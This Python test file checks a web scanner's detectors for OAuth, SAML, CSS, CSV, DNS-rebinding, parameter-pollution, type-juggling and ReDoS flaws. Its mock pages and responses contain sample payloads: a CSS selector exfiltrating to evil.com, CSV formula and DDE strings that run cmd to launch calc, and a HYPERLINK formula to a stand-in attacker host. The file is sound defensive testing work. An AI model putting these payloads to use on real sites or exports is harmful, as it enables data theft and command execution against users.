"""Tests for Phase 26 — New Vulnerability Classes (Batch 1).

Covers: OAuthTester, SAMLTester, CSSInjectionTester, CSVInjectionTester,
        DNSRebindingTester, HPPTester, TypeJugglingTester, ReDoSTester
"""
import time
from unittest.mock import patch, MagicMock
from tests.conftest import MockPage, MockForm, MockFormInput


# ═══════════════════════════════════════════════════════════════════════════════
# OAuthTester
# ═══════════════════════════════════════════════════════════════════════════════

class TestOAuthTester:
    def setup_method(self):
        from apps.scanning.engine.testers.oauth_tester import OAuthTester
        self.tester = OAuthTester()

    def test_tester_name(self):
        assert self.tester.TESTER_NAME == 'OAuth Misconfiguration'

    def test_non_oauth_endpoint_returns_empty(self):
        page = MockPage(url='https://example.com/about', body='<h1>About</h1>')
        assert self.tester.test(page) == []

    def test_client_credential_exposure(self):
        page = MockPage(
            url='https://example.com/oauth/authorize',
            body='var config = {client_secret: "abc123secretXYZlong", client_id: "myapp"};',
        )
        vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'OAuth Client Secret Exposure' in names

    def test_state_parameter_missing(self):
        page = MockPage(
            url='https://example.com/oauth/authorize?client_id=app&redirect_uri=http://cb',
            body='<form action="/oauth/authorize"><input name="scope" value="read"></form>',
            forms=[MockForm(
                action='/oauth/authorize', method='GET',
                inputs=[MockFormInput(name='scope', input_type='text', value='read')],
            )],
            parameters={'client_id': 'app', 'redirect_uri': 'http://cb'},
        )
        vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'OAuth Missing State Parameter' in names

    def test_redirect_uri_bypass(self):
        page = MockPage(
            url='https://example.com/oauth/authorize?client_id=app&redirect_uri=http://cb&state=abcdefghij1234567890abcdefghij12',
            body='<html></html>',
            parameters={'client_id': 'app', 'redirect_uri': 'http://cb',
                        'state': 'abcdefghij1234567890abcdefghij12'},
        )
        resp_ok = MagicMock(status_code=302)
        resp_ok.headers = {'Location': 'https://evil.example.com/?code=xyz'}
        with patch.object(self.tester, '_make_request', return_value=resp_ok):
            vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'OAuth Redirect URI Bypass' in names

    def test_token_in_referer(self):
        page = MockPage(
            url='https://example.com/oauth/callback?access_token=secret123',
            body='<a href="http://external.com">link</a>',
            parameters={'access_token': 'secret123'},
        )
        vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'OAuth Token Leakage via URL' in names

    def test_no_false_positive_without_credentials(self):
        page = MockPage(
            url='https://example.com/oauth/authorize',
            body='<html>Login with OAuth</html>',
        )
        vulns = self.tester.test(page)
        cred_vulns = [v for v in vulns if 'Secret Exposure' in v['name']]
        assert len(cred_vulns) == 0

    def test_pkce_bypass_detection(self):
        page = MockPage(
            url='https://example.com/oauth/authorize?response_type=code&client_id=app&redirect_uri=http://cb',
            body='<html>Authorize</html>',
            parameters={'response_type': 'code', 'client_id': 'app', 'redirect_uri': 'http://cb'},
        )
        vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'OAuth PKCE Not Enforced' in names


# ═══════════════════════════════════════════════════════════════════════════════
# SAMLTester
# ═══════════════════════════════════════════════════════════════════════════════

class TestSAMLTester:
    def setup_method(self):
        from apps.scanning.engine.testers.saml_tester import SAMLTester
        self.tester = SAMLTester()

    def test_tester_name(self):
        assert self.tester.TESTER_NAME == 'SAML Injection'

    def test_non_saml_endpoint_returns_empty(self):
        page = MockPage(url='https://example.com/home', body='<h1>Home</h1>')
        assert self.tester.test(page) == []

    def test_metadata_exposure(self):
        page = MockPage(
            url='https://example.com/saml/metadata',
            body='<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata">'
                 '<X509Certificate>MIIC...</X509Certificate></EntityDescriptor>',
            headers={'Content-Type': 'text/xml'},
        )
        resp = MagicMock(status_code=200)
        resp.text = ('<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata">'
                     '<IDPSSODescriptor/></EntityDescriptor>')
        resp.headers = {}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'SAML Metadata Exposure' in names

    def test_signature_wrapping(self):
        page = MockPage(
            url='https://example.com/saml/acs',
            body='<html>SAML login</html>',
        )
        resp_ok = MagicMock(status_code=200)
        resp_ok.text = 'Welcome, admin'
        resp_ok.headers = {}
        with patch.object(self.tester, '_make_request', return_value=resp_ok):
            vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'SAML XML Signature Wrapping' in names

    def test_comment_injection(self):
        page = MockPage(
            url='https://example.com/saml/acs',
            body='<html>SAML login</html>',
        )
        # Metadata check returns 404, XSW returns error, but comment injection succeeds
        call_count = [0]
        def side_effect(*args, **kwargs):
            call_count[0] += 1
            resp = MagicMock(status_code=200)
            resp.headers = {}
            # Comment injection POST returns 'admin' in body
            data = kwargs.get('data', {})
            if isinstance(data, dict) and 'SAMLResponse' in data:
                body = data['SAMLResponse']
                if '<!--' in body:
                    # comment injection attempt
                    resp.text = 'Welcome, admin user'
                    return resp
                else:
                    # XSW attempt - return error
                    resp.text = 'Invalid signature'
                    return resp
            resp.status_code = 404
            resp.text = 'Not found'
            return resp

        with patch.object(self.tester, '_make_request', side_effect=side_effect):
            vulns = self.tester.test(page, depth='deep')
        names = [v['name'] for v in vulns]
        assert 'SAML Comment Injection' in names

    def test_replay_indicators(self):
        page = MockPage(
            url='https://example.com/saml/sso',
            body='<input name="SAMLResponse" value="PHA+..."/>',
            headers={'Cache-Control': 'public'},
        )
        # Mock to avoid real HTTP for metadata/XSW checks
        resp_fail = MagicMock(status_code=403)
        resp_fail.text = 'Forbidden'
        resp_fail.headers = {}
        with patch.object(self.tester, '_make_request', return_value=resp_fail):
            vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'SAML Replay Vulnerability' in names

    def test_no_vuln_on_non_saml(self):
        page = MockPage(url='https://example.com/api/data', body='{"key":"value"}')
        vulns = self.tester.test(page)
        assert vulns == []


# ═══════════════════════════════════════════════════════════════════════════════
# CSSInjectionTester
# ═══════════════════════════════════════════════════════════════════════════════

class TestCSSInjectionTester:
    def setup_method(self):
        from apps.scanning.engine.testers.css_injection_tester import CSSInjectionTester
        self.tester = CSSInjectionTester()

    def test_tester_name(self):
        assert self.tester.TESTER_NAME == 'CSS Injection'

    def test_existing_css_exfil(self):
        page = MockPage(
            url='https://example.com/profile',
            body='<style>input[value^="s"]{background:url(http://evil.com/s)}</style>',
        )
        vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'CSS Data Exfiltration Pattern' in names

    def test_style_attribute_injection(self):
        page = MockPage(
            url='https://example.com/page',
            body='<div style="background:expression(alert(1))">Hello</div>',
        )
        vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'Dangerous Style Attribute' in names

    def test_param_css_injection(self):
        page = MockPage(
            url='https://example.com/page?theme=default',
            body='<html><style>body{background:default}</style></html>',
            parameters={'theme': 'default'},
        )
        resp = MagicMock(status_code=200)
        resp.text = '<style>body{background:cssinjtest42}*{background:url(https://evil.example.com/)}</style>'
        resp.headers = {}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'CSS Injection via Parameter' in names

    def test_form_css_injection(self):
        page = MockPage(
            url='https://example.com/settings',
            body='<html><form><input name="style"></form></html>',
            forms=[MockForm(
                action='/settings', method='POST',
                inputs=[MockFormInput(name='style', input_type='text', value='blue')],
            )],
        )
        resp = MagicMock(status_code=200)
        resp.text = '<html>cssinjtest42}body{background:url(//evil.example.com/)</html>'
        resp.headers = {}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page, depth='deep')
        names = [v['name'] for v in vulns]
        assert 'CSS Injection via Form' in names

    def test_no_css_on_clean_page(self):
        page = MockPage(
            url='https://example.com/',
            body='<html><body>No CSS issues here</body></html>',
        )
        assert self.tester.test(page) == []


# ═══════════════════════════════════════════════════════════════════════════════
# CSVInjectionTester
# ═══════════════════════════════════════════════════════════════════════════════

class TestCSVInjectionTester:
    def setup_method(self):
        from apps.scanning.engine.testers.csv_injection_tester import CSVInjectionTester
        self.tester = CSVInjectionTester()

    def test_tester_name(self):
        assert self.tester.TESTER_NAME == 'CSV Injection'

    def test_formula_in_body(self):
        page = MockPage(
            url='https://example.com/export.csv',
            body='Name,Email\n=CMD("calc"),user@example.com',
            headers={'Content-Type': 'text/csv'},
        )
        vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'Formula Content in Response' in names

    def test_csv_export_injection(self):
        page = MockPage(
            url='https://example.com/reports/export?search=test',
            body='<a href="/export">Download CSV</a>',
            parameters={'search': 'test'},
            headers={'Content-Type': 'text/csv'},
        )
        resp = MagicMock(status_code=200)
        resp.text = 'Name\n=cmd|"/C calc"!A0\nOther'
        resp.headers = {'Content-Type': 'text/csv'}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'CSV Formula Injection' in names

    def test_form_csv_injection(self):
        page = MockPage(
            url='https://example.com/export',
            body='<form action="/export"><input name="data"></form>',
            forms=[MockForm(
                action='/export', method='POST',
                inputs=[MockFormInput(name='data', input_type='text')],
            )],
        )
        resp = MagicMock(status_code=200)
        resp.text = '=HYPERLINK("https://evil.example.com/","Click")\ndata row'
        resp.headers = {'Content-Type': 'text/csv'}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'CSV Formula Injection via Form' in names

    def test_dde_injection(self):
        page = MockPage(
            url='https://example.com/export/data?q=x',
            body='<html>Export</html>',
            parameters={'q': 'x'},
            headers={'Content-Type': 'text/csv'},
        )
        resp = MagicMock(status_code=200)
        resp.text = '=DDE("cmd","/C calc","!A0")\nRow2'
        resp.headers = {'Content-Type': 'text/csv'}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page, depth='deep')
        names = [v['name'] for v in vulns]
        assert 'DDE Injection' in names

    def test_no_vuln_on_normal_csv(self):
        page = MockPage(
            url='https://example.com/data.csv',
            body='Name,Email\nJohn,john@example.com',
            headers={'Content-Type': 'text/csv'},
        )
        vulns = self.tester.test(page)
        assert vulns == []

    def test_no_vuln_on_non_csv_page(self):
        page = MockPage(url='https://example.com/', body='<html>Hello</html>')
        assert self.tester.test(page) == []


# ═══════════════════════════════════════════════════════════════════════════════
# DNSRebindingTester
# ═══════════════════════════════════════════════════════════════════════════════

class TestDNSRebindingTester:
    def setup_method(self):
        from apps.scanning.engine.testers.dns_rebinding_tester import DNSRebindingTester
        self.tester = DNSRebindingTester()

    def test_tester_name(self):
        assert self.tester.TESTER_NAME == 'DNS Rebinding'

    def test_internal_ip_exposure(self):
        page = MockPage(
            url='https://example.com/api/status',
            body='{"server": "192.168.1.100", "status": "ok"}',
        )
        vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'Internal IP Address Exposure' in names

    def test_host_header_validation(self):
        page = MockPage(
            url='https://example.com/api/data',
            body='<html>OK</html>',
        )
        resp = MagicMock(status_code=200)
        resp.text = '<html><head><title>Page</title></head><body>' + 'A' * 100 + '</body></html>'
        resp.headers = {}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'DNS Rebinding - Missing Host Validation' in names

    def test_metadata_indicators(self):
        page = MockPage(
            url='https://example.com/proxy',
            body='Fetching from 169.254.169.254/latest/meta-data/ returned credentials',
        )
        resp = MagicMock(status_code=403)
        resp.text = 'Forbidden'
        resp.headers = {}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page, depth='deep')
        names = [v['name'] for v in vulns]
        assert 'Cloud Metadata Endpoint Reference' in names

    def test_no_vuln_on_clean_page(self):
        page = MockPage(
            url='https://example.com/',
            body='<html><body>Clean page</body></html>',
        )
        resp = MagicMock(status_code=403)
        resp.text = 'Forbidden'
        resp.headers = {}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        ip_vulns = [v for v in vulns if 'IP' in v['name'] or 'DNS' in v['name']]
        assert len(ip_vulns) == 0

    def test_10_x_ip_detected(self):
        page = MockPage(
            url='https://example.com/debug',
            body='Internal server at 10.0.0.5 port 8080',
        )
        vulns = self.tester.test(page)
        assert any('Internal IP Address Exposure' in v['name'] for v in vulns)


# ═══════════════════════════════════════════════════════════════════════════════
# HPPTester
# ═══════════════════════════════════════════════════════════════════════════════

class TestHPPTester:
    def setup_method(self):
        from apps.scanning.engine.testers.hpp_tester import HPPTester
        self.tester = HPPTester()

    def test_tester_name(self):
        assert self.tester.TESTER_NAME == 'HTTP Parameter Pollution'

    def test_url_hpp(self):
        page = MockPage(
            url='https://example.com/search?q=test',
            body='<html>Results for: test</html>',
            parameters={'q': 'test'},
        )
        resp = MagicMock(status_code=200)
        # Response reflects both values — HPP accepted
        resp.text = '<html>Results for: test hpptest42</html>'
        resp.headers = {}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'HTTP Parameter Pollution' in names

    def test_sensitive_param_hpp(self):
        page = MockPage(
            url='https://example.com/transfer?amount=100&to=user1',
            body='<html>Transfer</html>',
            parameters={'amount': '100', 'to': 'user1'},
        )
        resp = MagicMock(status_code=200)
        resp.text = '<html>Transfer amount: hpptest42</html>'
        resp.headers = {}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'HPP on Security-Sensitive Parameter' in names

    def test_form_hpp(self):
        page = MockPage(
            url='https://example.com/submit',
            body='<form action="/submit"><input name="email"></form>',
            forms=[MockForm(
                action='/submit', method='POST',
                inputs=[MockFormInput(name='email', input_type='email', value='a@b.com')],
            )],
        )
        resp = MagicMock(status_code=200)
        resp.text = '<html>Email: hpptest42</html>'
        resp.headers = {}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page, depth='deep')
        names = [v['name'] for v in vulns]
        assert 'HPP in Form Submission' in names

    def test_no_hpp_when_marker_not_reflected(self):
        page = MockPage(
            url='https://example.com/search?q=test',
            body='<html>Results</html>',
            parameters={'q': 'test'},
        )
        resp = MagicMock(status_code=200)
        resp.text = '<html>Results for: test</html>'  # marker NOT reflected
        resp.headers = {}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        assert vulns == []

    def test_no_vuln_without_params(self):
        page = MockPage(url='https://example.com/', body='<html>Home</html>')
        assert self.tester.test(page) == []


# ═══════════════════════════════════════════════════════════════════════════════
# TypeJugglingTester
# ═══════════════════════════════════════════════════════════════════════════════

class TestTypeJugglingTester:
    def setup_method(self):
        from apps.scanning.engine.testers.type_juggling_tester import TypeJugglingTester
        self.tester = TypeJugglingTester()

    def test_tester_name(self):
        assert self.tester.TESTER_NAME == 'Type Juggling'

    def test_magic_hash_detected(self):
        page = MockPage(
            url='https://example.com/login.php',
            body='<form action="/login.php" method="POST">'
                 '<input name="username"><input name="password" type="password"></form>',
            headers={'X-Powered-By': 'PHP/8.1'},
            forms=[MockForm(
                action='/login.php', method='POST',
                inputs=[
                    MockFormInput(name='username', input_type='text'),
                    MockFormInput(name='password', input_type='password'),
                ],
            )],
        )
        resp = MagicMock(status_code=302)
        resp.text = ''
        resp.headers = {'Location': '/dashboard'}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'PHP Magic Hash Type Juggling' in names

    def test_json_type_confusion(self):
        page = MockPage(
            url='https://example.com/api/login',
            body='{"message":"invalid credentials"}',
            headers={'Content-Type': 'application/json'},
        )
        resp = MagicMock(status_code=200)
        resp.text = '{"token":"abc123","success":true}'
        resp.headers = {}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'JSON Type Confusion' in names

    def test_form_type_juggling(self):
        page = MockPage(
            url='https://example.com/login',
            body='<form><input name="pass" type="password"></form>',
            forms=[MockForm(
                action='/login', method='POST',
                inputs=[MockFormInput(name='pass', input_type='password')],
            )],
        )
        resp = MagicMock(status_code=302)
        resp.text = ''
        resp.headers = {'Location': '/home'}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'Loose Comparison Type Juggling' in names

    def test_no_vuln_on_non_auth_page(self):
        page = MockPage(url='https://example.com/about', body='<h1>About</h1>')
        assert self.tester.test(page) == []

    def test_no_vuln_when_login_fails(self):
        page = MockPage(
            url='https://example.com/login.php',
            body='<form><input name="password" type="password"></form>',
            headers={'X-Powered-By': 'PHP/8.1'},
            forms=[MockForm(
                action='/login.php', method='POST',
                inputs=[MockFormInput(name='password', input_type='password')],
            )],
        )
        resp = MagicMock(status_code=302)
        resp.text = ''
        resp.headers = {'Location': '/login?error=invalid'}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        # magic hash should NOT report if redirect goes to login/error
        magic = [v for v in vulns if 'Magic Hash' in v['name']]
        assert len(magic) == 0

    def test_non_php_skips_magic_hash(self):
        page = MockPage(
            url='https://example.com/login',
            body='<form><input name="password"></form>',
            headers={'X-Powered-By': 'Express'},
            forms=[MockForm(
                action='/login', method='POST',
                inputs=[MockFormInput(name='password', input_type='password')],
            )],
        )
        resp = MagicMock(status_code=302)
        resp.text = ''
        resp.headers = {'Location': '/dashboard'}
        with patch.object(self.tester, '_make_request', return_value=resp):
            vulns = self.tester.test(page)
        magic = [v for v in vulns if 'Magic Hash' in v['name']]
        assert len(magic) == 0


# ═══════════════════════════════════════════════════════════════════════════════
# ReDoSTester
# ═══════════════════════════════════════════════════════════════════════════════

class TestReDoSTester:
    def setup_method(self):
        from apps.scanning.engine.testers.redos_tester import ReDoSTester
        self.tester = ReDoSTester()

    def test_tester_name(self):
        assert self.tester.TESTER_NAME == 'ReDoS'

    def test_regex_pattern_disclosure(self):
        page = MockPage(
            url='https://example.com/register',
            body='<p>Error: must match pattern: /^[a-zA-Z0-9]+@[a-zA-Z]+\\.[a-z]+$/</p>',
        )
        vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'Regex Pattern Information Disclosure' in names

    def test_form_redos_detection(self):
        page = MockPage(
            url='https://example.com/register',
            body='<form><input name="email" type="email"></form>',
            forms=[MockForm(
                action='/register', method='POST',
                inputs=[MockFormInput(name='email', input_type='email')],
            )],
        )

        call_count = [0]

        def mock_request(*args, **kwargs):
            call_count[0] += 1
            resp = MagicMock(status_code=200)
            resp.text = 'OK'
            resp.headers = {}
            # First call is baseline (fast), subsequent calls are slow
            if call_count[0] == 1:
                # baseline — fast
                pass
            else:
                # Evil input — simulate slow response (we manipulate time)
                pass
            return resp

        # We need to mock time.monotonic to simulate timing differences
        original_monotonic = time.monotonic
        times = iter([
            100.0,   # baseline t0
            100.1,   # baseline done (0.1s)
            100.2,   # evil t0
            103.0,   # evil done (2.8s — well above threshold)
        ])

        def mock_monotonic():
            try:
                return next(times)
            except StopIteration:
                return original_monotonic()

        with patch.object(self.tester, '_make_request', side_effect=mock_request):
            with patch('apps.scanning.engine.testers.redos_tester.time.monotonic',
                       side_effect=mock_monotonic):
                vulns = self.tester.test(page)
        names = [v['name'] for v in vulns]
        assert 'Regular Expression Denial of Service (ReDoS)' in names

    def test_no_vuln_on_fast_response(self):
        page = MockPage(
            url='https://example.com/register',
            body='<form><input name="email" type="email"></form>',
            forms=[MockForm(
                action='/register', method='POST',
                inputs=[MockFormInput(name='email', input_type='email')],
            )],
        )

        original_monotonic = time.monotonic
        times = iter([
            100.0, 100.1,  # baseline: 0.1s
            100.2, 100.25, # evil: 0.05s — fast, no ReDoS
            100.3, 100.35, # evil2: 0.05s
            100.4, 100.45, # evil3: 0.05s
        ])

        def mock_monotonic():
            try:
                return next(times)
            except StopIteration:
                return original_monotonic()

        resp = MagicMock(status_code=200, text='OK', headers={})
        with patch.object(self.tester, '_make_request', return_value=resp):
            with patch('apps.scanning.engine.testers.redos_tester.time.monotonic',
                       side_effect=mock_monotonic):
                vulns = self.tester.test(page)
        redos = [v for v in vulns if 'ReDoS' in v['name']]
        assert len(redos) == 0

    def test_no_vuln_on_page_without_forms(self):
        page = MockPage(
            url='https://example.com/',
            body='<html><body>No forms</body></html>',
        )
        vulns = self.tester.test(page)
        assert vulns == []

    def test_param_redos(self):
        page = MockPage(
            url='https://example.com/validate?email=test@test.com',
            body='<html>Validation</html>',
            parameters={'email': 'test@test.com'},
        )

        original_monotonic = time.monotonic
        times = iter([
            100.0, 100.05,  # baseline: 0.05s
            100.1, 103.5,   # evil: 3.4s (slow!)
        ])

        def mock_monotonic():
            try:
                return next(times)
            except StopIteration:
                return original_monotonic()

        resp = MagicMock(status_code=200, text='OK', headers={})
        with patch.object(self.tester, '_make_request', return_value=resp):
            with patch('apps.scanning.engine.testers.redos_tester.time.monotonic',
                       side_effect=mock_monotonic):
                vulns = self.tester.test(page, depth='deep')
        names = [v['name'] for v in vulns]
        assert 'Regular Expression Denial of Service (ReDoS)' in names
